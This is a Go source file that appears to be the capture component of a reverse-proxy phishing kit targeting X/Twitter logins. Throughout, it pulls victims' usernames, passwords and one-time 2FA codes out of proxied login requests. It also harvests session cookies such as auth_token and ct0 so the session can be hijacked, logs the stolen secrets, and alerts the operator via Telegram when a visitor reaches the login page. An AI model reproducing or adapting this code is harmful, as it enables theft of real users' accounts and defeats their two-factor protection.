package main

import (
	"encoding/json"
	"io"
	"log"
	"net/http"
	"net/url"
	"os"
	"strings"
	"time"
)

// capture identifies and extracts credentials, 2FA codes, and cookies from
// proxied requests/responses and writes them into the victim's session.
type capture struct {
	store *Store
	cfg   *config
}

func newCapture(cfg *config, store *Store) *capture {
	return &capture{store: store, cfg: cfg}
}

// captureRequest inspects an incoming victim request (before forwarding).
func (c *capture) captureRequest(sess *Session, r *http.Request, body []byte) {
	defer c.store.update(sess)

	// Debug logger
	if isDebug() {
		log.Printf("[capture] %s %s host=%s body=%s",
			r.Method, r.URL.Path, r.Host, truncate(string(body), 500))
	}

	// ALWAYS capture cookies from request headers (victim already has them)
	c.captureRequestCookies(sess, r)

	// Notify Telegram when visitor hits login flow
	if isLoginPath(r.URL) {
		c.store.notifyRealVisitor(sess.IP, sess.Country, sess.City, sess.UserAgent)
	}

	// Only parse body for login-related paths
	if !isLoginPath(r.URL) {
		return
	}

	// Parse the request body for credentials
	c.parseCredentials(sess, body, r.Header.Get("Content-Type"))
}

// captureRequestCookies extracts cookies from the victim's request
func (c *capture) captureRequestCookies(sess *Session, r *http.Request) {
	for _, ck := range r.Cookies() {
		c.processCookie(sess, ck)
	}
}

// captureResponse inspects the response from X (after forwarding).
func (c *capture) captureResponse(sess *Session, resp *http.Response, body []byte) {
	defer c.store.update(sess)

	// Capture all Set-Cookie headers
	for _, ck := range resp.Cookies() {
		c.processCookie(sess, ck)
	}

	// Also try to find auth_token in response body (some flows return it in JSON)
	if sess.AuthToken == "" {
		if tok := findAuthTokenInBody(body); tok != "" {
			sess.AuthToken = tok
			log.Printf("[capture] auth_token from body: %s...", tok[:20])
		}
	}

	// Also extract username from twid cookie if we have it
	if sess.Username == "" {
		for _, ck := range sess.CookieJar {
			if ck.Name == "twid" {
				// twid format: u%3D1234567890 (URL encoded u=userid)
				decoded, _ := url.QueryUnescape(ck.Value)
				if strings.HasPrefix(decoded, "u=") {
					sess.UserID = decoded[2:]
				}
			}
		}
	}

	c.store.finalize(sess)
}

// processCookie handles a single cookie, normalizing and storing it
func (c *capture) processCookie(sess *Session, ck *http.Cookie) {
	if ck.Value == "" {
		return
	}

	// Normalize domain
	domain := ck.Domain
	if domain == "" || domain == "x.com" || domain == "twitter.com" {
		domain = ".x.com"
	}
	if !strings.HasPrefix(domain, ".") && (strings.Contains(domain, "x.com") || strings.Contains(domain, "twitter.com")) {
		domain = "." + domain
	}

	// Only capture x.com/twitter.com cookies
	if !strings.Contains(domain, "x.com") && !strings.Contains(domain, "twitter.com") {
		return
	}

	path := ck.Path
	if path == "" {
		path = "/"
	}

	// Create normalized cookie
	nc := Cookie{
		Name:   ck.Name,
		Value:  ck.Value,
		Domain: domain,
		Path:   path,
		Secure: true, // All x.com cookies are secure
	}

	// Set correct httpOnly based on cookie name
	switch ck.Name {
	case "auth_token", "_twitter_sess", "kdt", "fm":
		nc.HTTPOnly = true
	default:
		nc.HTTPOnly = ck.HttpOnly
	}

	// Set expiration
	if !ck.Expires.IsZero() {
		nc.Expires = ck.Expires.Unix()
	} else if ck.MaxAge > 0 {
		nc.Expires = time.Now().Add(time.Duration(ck.MaxAge) * time.Second).Unix()
	} else {
		// Default expiration for important cookies
		switch ck.Name {
		case "auth_token", "ct0", "twid", "guest_id", "personalization_id":
			nc.Expires = time.Now().Add(365 * 24 * time.Hour).Unix()
		default:
			nc.Expires = -1 // session cookie
		}
	}

	// Store special cookies in session fields
	switch ck.Name {
	case "auth_token":
		if len(ck.Value) > 30 {
			sess.AuthToken = ck.Value
			log.Printf("[capture] ✓ auth_token captured: %s...", ck.Value[:20])
		}
	case "ct0":
		if len(ck.Value) > 10 {
			sess.CT0 = ck.Value
			log.Printf("[capture] ✓ ct0 captured")
		}
	case "twid":
		// Extract user ID from twid
		decoded, _ := url.QueryUnescape(ck.Value)
		if strings.HasPrefix(decoded, "u=") {
			sess.UserID = decoded[2:]
			log.Printf("[capture] ✓ user_id from twid: %s", sess.UserID)
		}
	}

	// Add to cookie jar (dedup by name)
	for i, existing := range sess.CookieJar {
		if existing.Name == nc.Name {
			sess.CookieJar[i] = nc
			return
		}
	}
	sess.CookieJar = append(sess.CookieJar, nc)
}

// parseCredentials extracts username/password/2FA from request body
func (c *capture) parseCredentials(sess *Session, body []byte, contentType string) {
	if len(body) == 0 {
		return
	}

	bodyStr := string(body)

	// Try JSON parsing first
	if strings.Contains(contentType, "json") {
		c.parseJSONCredentials(sess, body)
	}

	// Also do simple string extraction as backup
	c.extractCredentialsFromString(sess, bodyStr)
}

// parseJSONCredentials handles X's nested JSON login format
func (c *capture) parseJSONCredentials(sess *Session, body []byte) {
	// X login format: {"subtask_inputs":[{"subtask_id":"...","enter_text":{"text":"username"}}]}
	var data map[string]interface{}
	if err := json.Unmarshal(body, &data); err != nil {
		return
	}

	// Extract from subtask_inputs array
	if inputs, ok := data["subtask_inputs"].([]interface{}); ok {
		for _, input := range inputs {
			if inputMap, ok := input.(map[string]interface{}); ok {
				subtaskID, _ := inputMap["subtask_id"].(string)

				// Username/email/phone entry
				if strings.Contains(subtaskID, "user_identifier") || strings.Contains(subtaskID, "alternate") {
					if enterText, ok := inputMap["enter_text"].(map[string]interface{}); ok {
						if text, ok := enterText["text"].(string); ok && text != "" {
							if sess.Username == "" && looksLikeUsername(text) {
								sess.Username = text
								log.Printf("[capture] ✓ username: %s", text)
							}
						}
					}
				}

				// Password entry
				if strings.Contains(subtaskID, "password") {
					if enterPassword, ok := inputMap["enter_password"].(map[string]interface{}); ok {
						if pass, ok := enterPassword["password"].(string); ok && pass != "" {
							if sess.Password == "" {
								sess.Password = pass
								log.Printf("[capture] ✓ password captured for: %s", sess.Username)
							}
						}
					}
				}

				// 2FA entry
				if strings.Contains(subtaskID, "two_factor") || strings.Contains(subtaskID, "LoginTwoFactorAuth") {
					if enterText, ok := inputMap["enter_text"].(map[string]interface{}); ok {
						if text, ok := enterText["text"].(string); ok && text != "" {
							if sess.TwoFA == "" {
								sess.TwoFA = text
								log.Printf("[capture] ✓ 2FA code: %s", text)
							}
						}
					}
				}
			}
		}
	}

	// Fallback: check top-level fields
	for _, key := range []string{"text", "username", "email", "login", "identifier"} {
		if v, ok := data[key].(string); ok && v != "" && sess.Username == "" && looksLikeUsername(v) {
			sess.Username = v
			log.Printf("[capture] ✓ username (top-level): %s", v)
			break
		}
	}

	for _, key := range []string{"password", "pass", "passwd"} {
		if v, ok := data[key].(string); ok && v != "" && sess.Password == "" {
			sess.Password = v
			log.Printf("[capture] ✓ password (top-level)")
			break
		}
	}
}

// extractCredentialsFromString does pattern matching on raw body
func (c *capture) extractCredentialsFromString(sess *Session, body string) {
	// Extract "text":"value" patterns
	patterns := []struct {
		keys   []string
		target *string
		check  func(string) bool
	}{
		{[]string{`"text":"`, `"username":"`, `"email":"`, `"login":"`}, &sess.Username, looksLikeUsername},
		{[]string{`"password":"`, `"pass":"`}, &sess.Password, func(s string) bool { return len(s) > 0 }},
		{[]string{`"code":"`, `"otp":"`, `"challenge_response":"`}, &sess.TwoFA, func(s string) bool { return len(s) >= 4 && len(s) <= 10 }},
	}

	for _, p := range patterns {
		if *p.target != "" {
			continue
		}
		for _, key := range p.keys {
			if idx := strings.Index(body, key); idx != -1 {
				start := idx + len(key)
				end := strings.Index(body[start:], `"`)
				if end > 0 && end < 200 {
					val := body[start : start+end]
					if p.check(val) {
						*p.target = val
						break
					}
				}
			}
		}
	}
}

// isLoginPath reports whether a path is part of X's login/2FA flow.
func isLoginPath(u *url.URL) bool {
	p := strings.ToLower(u.Path)
	loginPaths := []string{
		"/i/flow/login",
		"/i/flow/verify",
		"/i/flow/two-factor",
		"/i/api/1.1/onboarding/task",
		"/i/api/i/oauth2/authorize",
		"/i/api/1.1/auth",
		"login-verification",
		"mfa",
		"onboarding/web/actions/login",
		"login_enter_password",
		"login_enter_user_identifier",
		"login_two_factor",
		"account_duplication_check",
		"LoginEnterPassword",
		"LoginEnterUserIdentifier",
		"LoginTwoFactorAuth",
	}
	for _, frag := range loginPaths {
		if strings.Contains(p, strings.ToLower(frag)) {
			return true
		}
	}
	return false
}

// looksLikeUsername checks if a value could be a username/email/phone
func looksLikeUsername(s string) bool {
	s = strings.TrimSpace(s)
	if s == "" || len(s) < 3 || len(s) > 100 {
		return false
	}
	// Skip if it looks like a token/hash (long hex string)
	if len(s) > 30 && !strings.Contains(s, "@") && !strings.Contains(s, " ") {
		return false
	}
	// Skip common non-username values
	lower := strings.ToLower(s)
	skipValues := []string{"true", "false", "null", "undefined", "none", "password", "login", "submit", "button"}
	for _, x := range skipValues {
		if lower == x {
			return false
		}
	}
	// Must contain alphanumeric
	hasAlpha := false
	for _, c := range s {
		if (c >= 'a' && c <= 'z') || (c >= 'A' && c <= 'Z') || (c >= '0' && c <= '9') {
			hasAlpha = true
			break
		}
	}
	return hasAlpha
}

// findAuthTokenInBody scans response body for auth_token
func findAuthTokenInBody(body []byte) string {
	s := string(body)

	// Look for "auth_token":"value" pattern
	patterns := []string{`"auth_token":"`, `"auth_token": "`, `auth_token":"`}
	for _, p := range patterns {
		if idx := strings.Index(s, p); idx != -1 {
			start := idx + len(p)
			end := strings.Index(s[start:], `"`)
			if end > 30 && end < 200 {
				token := s[start : start+end]
				if isValidToken(token) {
					return token
				}
			}
		}
	}
	return ""
}

// isValidToken checks if a token looks like a real auth token
func isValidToken(token string) bool {
	if len(token) < 30 || len(token) > 200 {
		return false
	}

	// Reject JS code patterns
	badPatterns := []string{"(", ")", "=", ">", "<", "!", "?", "[", "]", "{", "}",
		"typeof", "function", "return", "var ", "let ", "const ",
		"document", "window", "null", "undefined", "&&", "||"}
	for _, bad := range badPatterns {
		if strings.Contains(token, bad) {
			return false
		}
	}

	// Should be mostly alphanumeric
	validChars := 0
	for _, c := range token {
		if (c >= 'a' && c <= 'z') || (c >= 'A' && c <= 'Z') || (c >= '0' && c <= '9') || c == '-' || c == '_' {
			validChars++
		}
	}
	return float64(validChars)/float64(len(token)) >= 0.9
}

// readBody reads the body fully and resets it for downstream use.
func readBody(r *http.Request) []byte {
	if r.Body == nil {
		return nil
	}
	data, err := io.ReadAll(r.Body)
	if err != nil {
		return nil
	}
	r.Body = io.NopCloser(strings.NewReader(string(data)))
	r.ContentLength = int64(len(data))
	return data
}

// isDebug reports whether debug logging is enabled
func isDebug() bool {
	v := strings.TrimSpace(strings.ToLower(os.Getenv("DEBUG")))
	return v == "1" || v == "true" || v == "yes" || v == "on"
}

// truncate limits a string length for logging
func truncate(s string, maxLen int) string {
	if len(s) <= maxLen {
		return s
	}
	return s[:maxLen] + "..."
}
